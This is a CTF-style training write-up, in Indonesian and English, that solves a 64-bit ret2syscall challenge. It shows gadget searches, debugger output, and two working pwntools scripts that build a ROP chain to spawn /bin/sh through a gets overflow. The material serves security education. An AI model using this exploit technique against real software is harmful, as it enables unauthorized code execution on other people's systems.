---
slug: "pwn-ret2syscall-2"
title: "ret2syscall"
competition: "Exercise"
category: "Pwn"
difficulty: "Easy"
date: "2026-08-18"
updated: "2026-08-24"
summary: "Latihan buat persiapan seleksi LKS, isinya ret2syscall."
tags: ["PWN","ROP","HANDS-ON","EASY","X64","RET2SYSCALL"]
status: "published"
flag: "SHELL"
attachments: []
source: "https://claritys.web.id/writeups/pwn-ret2syscall-2"
---

# ret2syscall

> Latihan buat persiapan seleksi LKS, isinya ret2syscall.

Di awal, kita sudah diberi hint bahwa challenge ini itu ret2syscall. Langsung saja kita checksec. Gomen kalau textnya sama kayak yang 32 bit yaak.

```bash
~/ctf/pwncheatsheet/latihanpwnlks/Binary_Exploit/Hands-on/ROP/ret2syscall main*
❯ checksec file log_conver_64                                                                                                                                                    󰥔 21:02:04

  _____ _    _ ______ _____ _  __ _____ ______ _____
 / ____| |  | |  ____/ ____| |/ // ____|  ____/ ____|
| |    | |__| | |__ | |    | ' /| (___ | |__ | |
| |    |  __  |  __|| |    |  <  \___ \|  __|| |
| |____| |  | | |___| |____| . \ ____) | |___| |____
 \_____|_|  |_|______\_____|_|\_\_____/|______\_____|

RELRO          Stack Canary     CFI      NX          PIE           RPATH     RUNPATH     Symbols     SafeStack           Stack Clash  W^X Seg  Selfrando     Sanitizers  FORTIFY Lvl  GLIBCXX Assert  FORTIFY  Fortified  Fortifiable  Name
Partial RELRO  No Canary Found  Unknown  NX enabled  PIE Disabled  No RPATH  No RUNPATH  No Symbols  No SafeStack Found  No Probes    Enabled  No Selfrando  None        Unknown      Unknown         No       0          1            log_conver_64
```

Honestly, at first I confused, because how can i check the main function

```bash
~/ctf/pwncheatsheet/latihanpwnlks/Binary_Exploit/Hands-on/ROP/ret2syscall main*
❯ pwndbg log_conver_64                                                                                                                                                           󰥔 21:02:17
info fuGEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 16.3 in 0.00ms using Python engine 3.13
pwndbg: loaded 212 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
Reading symbols from log_conver_64...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.archlinux.org>
  <https://debuginfod.cachyos.org>
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
(No debugging symbols found in log_conver_64)
gef➤  info fun
All defined functions:

Non-debugging symbols:
0x0000000000401030  puts@plt
0x0000000000401040  printf@plt
0x0000000000401050  gets@plt
0x0000000000401060  setvbuf@plt
gef➤
```

Because it was stripped 😭

```bash
~/ctf/pwncheatsheet/latihanpwnlks/Binary_Exploit/Hands-on/ROP/ret2syscall main*
❯ file log_conver_64                                                             󰥔 21:02:56
log_conver_64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c4b9df482f6957c5bad739691c186a4ee7459e63, for GNU/Linux 3.2.0, stripped
```

Okay, and now we search for the offset for the EIP.

```
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x23
$rbx   : 0x0
$rcx   : 0x00007ffff7e4a750  →  0x0000000000000000
$rdx   : 0x00007ffff7e4a750  →  0x0000000000000000
$rsp   : 0x00007fffffffdbb8  →  "haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa"
$rbp   : 0x6161616161616167 ("gaaaaaaa"?)
$rsi   : 0x00007ffff7e49603  →  0xe4a750000000000a ("\n"?)
$rdi   : 0x1
$rip   : 0x00000000004011f7  →   ret
$r8    : 0x1
$r9    : 0x0
$r10   : 0x0
$r11   : 0x202
$r12   : 0x1
$r13   : 0x00007fffffffdce0  →  0x0000000000000001
$r14   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2e0  →  0x0000000000000000
$r15   : 0x00007fffffffdcf8  →  0x00007fffffffe193  →  "GHOSTTY_RESOURCES_DIR=/usr/share/ghostty"
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
──────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdbb8│+0x0000: "haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa"       ← $rsp
0x00007fffffffdbc0│+0x0008: "iaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa"
0x00007fffffffdbc8│+0x0010: "jaaaaaaakaaaaaaalaaaaaaamaaa"
0x00007fffffffdbd0│+0x0018: "kaaaaaaalaaaaaaamaaa"
0x00007fffffffdbd8│+0x0020: "laaaaaaamaaa"
0x00007fffffffdbe0│+0x0028: 0x000000006161616d ("maaa"?)
0x00007fffffffdbe8│+0x0030: 0x00007fffffffdce8  →  0x00007fffffffe12e  →  "/home/claritys/ctf/pwncheatsheet/latihanpwnlks/Bin[...]"
0x00007fffffffdbf0│+0x0038: 0x00007fffffffdcd0  →  0x00007fffffffdcd8  →  0x0000000000000038 ("8"?)
────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4011f0                  call   0x401030 <puts@plt>
     0x4011f5                  nop
     0x4011f6                  leave
 →   0x4011f7                  ret
[!] Cannot disassemble from $PC
────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "log_conver_64", stopped 0x4011f7 in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4011f7 → ret
───────────────────────────────────────────────────────────────────────────────────────────
gef➤  cyclic -l haaaaaaa
Finding cyclic pattern of 8 bytes: b'haaaaaaa' (hex: 0x6861616161616161)
Found at offset 56
```

Nah, kalau untuk ret2syscall kita tinggal cari address yang nyimpen pop ya ges yak, biar kita bisa masukin value value.

```bash
~/ctf/pwncheatsheet/latihanpwnlks/Binary_Exploit/Hands-on/ROP/ret2syscall main*
❯ ropper -f log_conver_64 --search "pop"                                         󰥔 21:02:59
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: log_conver_64
0x000000000040127c: pop r12; pop r13; pop r14; pop r15; ret;
0x000000000040127e: pop r13; pop r14; pop r15; ret;
0x0000000000401280: pop r14; pop r15; ret;
0x0000000000401282: pop r15; ret;
0x000000000040119d: pop rax; ret;
0x000000000040127b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
0x000000000040127f: pop rbp; pop r14; pop r15; ret;
0x000000000040113d: pop rbp; ret;
0x0000000000401283: pop rdi; ret;
0x000000000040119f: pop rdx; ret;
0x0000000000401281: pop rsi; pop r15; ret;
0x000000000040127d: pop rsp; pop r13; pop r14; pop r15; ret;
```

Nah, berdasarkan web [https://x64.syscall.sh/](https://x64.syscall.sh/), itu kita bisa melihat apa saja yang diperlukan.

![](/assets/uploads/30ff98d3-8b38-4397-b943-8551df5f003a-image.png)

Setelah kita lihat, kita dapat banyak pop yang diperlukan untuk melakukan chaining. My own solver: (actually I’m using template from pwninit and then i modifed it a bit for my own environment)

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("log_conver_64_patched")

exe = context.binary
context.terminal = ["ghostty", "-e"]
context.arch = "amd64"

gdbscript = """
set pagination off
set confirm off

break main
continue
"""

def conn():
    if args.GDB:
        r = process([elf.path])
        gdb.attach(r, gdbscript=gdbscript)
        return r

    if args.LOCAL:
        return process([elf.path])

    return remote("addr", 1337)

def main():
    r = conn()
    binsh = next(elf.search(b"/bin/sh\x00"))
    chain = flat(
        0x000000000040119d, #RAX
        0x3B, #hex execve buat RAX
        0x0000000000401283, #RDI
        binsh, 
        0x0000000000401281, #RSI + R15 terpaksa ada r15 karena adanya itu
        0x0,
        0x0,
        0x000000000040119f, #RDX
        0x0,
        0x00000000004011a1 #Syscall
    )
    payload = b'A' * 56 
    payload += chain
    # good luck pwning :)

    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()
```

Sebenarnya di sini aku sempet error trouble, yang pertama itu aku pas mencari pop rsi itu adanya dia ngajak r15.

```bash
~/ctf/pwncheatsheet/latihanpwnlks/Binary_Exploit/Hands-on/ROP/ret2syscall main*
❯ ropper -f log_conver_64 --search "pop rsi"                                     󰥔 21:21:27
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rsi

[INFO] File: log_conver_64
0x0000000000401281: pop rsi; pop r15; ret;
```

Nah awalnya sih aku ngasih 0x0 itu cuman sekali, nggak dua kali buat ngisi r15, makanya error. Setelah itu aku asumsi lagi kalau harusnya si pop r15 ini harus di isi sih atleast.

Nah yang kedua adalah, karena aku ngide pake flat. Terus aku gak declare context.arch.. jadinya ya error wkwkw. Aku sadarnya pas aku GDB in si bro itu.

```
$rax   : 0x23
$rbx   : 0x0
$rcx   : 0x00007ff18c84a750  →  0x0000000000000000
$rdx   : 0x00007ff18c84a750  →  0x0000000000000000
$rsp   : 0x00007ffc327dc9c0  →  0x0040405000401283
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x00007ff18c849603  →  0x84a750000000000a ("\n"?)
$rdi   : 0x1
$rip   : 0x3b0040119d
$r8    : 0x1
$r9    : 0x0
$r10   : 0x0
$r11   : 0x202
$r12   : 0x1
$r13   : 0x00007ffc327dcae0  →  0x0000000000000001
$r14   : 0x00007ff18c8dd000  →  0x00007ff18c8de2e0  →  0x0000000000000000
$r15   : 0x00007ffc327dcaf8  →  0x00007ffc327dd2cd  →  0x00313d4c564c4853 ("SHLVL=1"?)
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
──────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffc327dc9c0│+0x0000: 0x0040405000401283   ← $rsp
0x00007ffc327dc9c8│+0x0008: 0x0000000000401281  →   pop rsi
0x00007ffc327dc9d0│+0x0010: 0x0040119f00000000
0x00007ffc327dc9d8│+0x0018: 0x004011a100000000
0x00007ffc327dc9e0│+0x0020: 0x0000000100000000
0x00007ffc327dc9e8│+0x0028: 0x00007ffc327dcae8  →  0x00007ffc327dd260  →  "/home/claritys/ctf/pwncheatsheet/latihanpwnlks/Bin[...]"
0x00007ffc327dc9f0│+0x0030: 0x00007ffc327dcad0  →  0x00007ffc327dcad8  →  0x0000000000000038 ("8"?)
0x00007ffc327dc9f8│+0x0038: 0x00007ff18c8c11c3  →   mov rax, QWORD PTR [rsp+0x10]
────────────────────────────────────────────────────────────────────────── code:x86:64 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x3b0040119d
────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "log_conver_64_p", stopped 0x3b0040119d in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────
gef➤  info registers
rax            0x23                0x23
rbx            0x0                 0x0
rcx            0x7ff18c84a750      0x7ff18c84a750
rdx            0x7ff18c84a750      0x7ff18c84a750
rsi            0x7ff18c849603      0x7ff18c849603
rdi            0x1                 0x1
rbp            0x4141414141414141  0x4141414141414141
rsp            0x7ffc327dc9c0      0x7ffc327dc9c0
r8             0x1                 0x1
r9             0x0                 0x0
r10            0x0                 0x0
r11            0x202               0x202
r12            0x1                 0x1
r13            0x7ffc327dcae0      0x7ffc327dcae0
r14            0x7ff18c8dd000      0x7ff18c8dd000
r15            0x7ffc327dcaf8      0x7ffc327dcaf8
rip            0x3b0040119d        0x3b0040119d
eflags         0x10202             [ IF RF ]
cs             0x33                0x33
ss             0x2b                0x2b
ds             0x0                 0x0
es             0x0                 0x0
fs             0x0                 0x0
gs             0x0                 0x0
pl3_ssp        <unavailable>
fs_base        0x7ff18c85b740      0x7ff18c85b740
gs_base        0x0                 0x0
gef➤
```

Bisa dilihat tuh RIP nya berapa wkwk. Ada campuran campuran geli geli gitu lah.

Solver resmi dari latihan LKS nya adalah:

```python
from pwn import *

elf = context.binary = ELF('./log_conver_64')
p = process()

rdi = p64(0x401283)
ret = p64(0x40101a)
rax = p64(0x40119d)
rsi = p64(0x401281)
rdx = p64(0x40119f)
syscall = p64(0x4011a1)
shell = next(elf.search(b'/bin/sh\x00'))

offset = 56

payload = flat(
        'A' * offset,
        rax, p64(0x3b),
        rdi, shell,
        rsi, p64(0), p64(0),
        rdx, p64(0),
        syscall
)

p.sendlineafter(b'> ', payload)
p.interactive()
```

For the x64, i don’t cheat like reading the solver. I’m trying my best to solve this without cheating. I’m using AI just for helping me debugging. (Honestly aku sadar harus pake context.arch karena AI hehe, but ofc ngerakit payload sendiri yah).

**Implement:**

```bash
~/ctf/pwncheatsheet/latihanpwnlks/Binary_Exploit/Hands-on/ROP/ret2syscall main*
❯ python3 solve.py LOCAL                                                                                                                                                         󰥔 21:43:21
[*] '/home/claritys/ctf/pwncheatsheet/latihanpwnlks/Binary_Exploit/Hands-on/ROP/ret2syscall/log_conver_64_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
[+] Starting local process '/home/claritys/ctf/pwncheatsheet/latihanpwnlks/Binary_Exploit/Hands-on/ROP/ret2syscall/log_conver_64_patched': pid 3727558
[*] Switching to interactive mode
Yui: Lylera, sistem utama lagi maintenance.
Yui: Tolong masukin log manual ya di sini.
Lylera:
> Yui: Log udah aku simpan. Makasih!
$ ls
log_conver.zip  log_conver_32.py  log_conver_64.py       solve.py
log_conver_32   log_conver_64     log_conver_64_patched
```
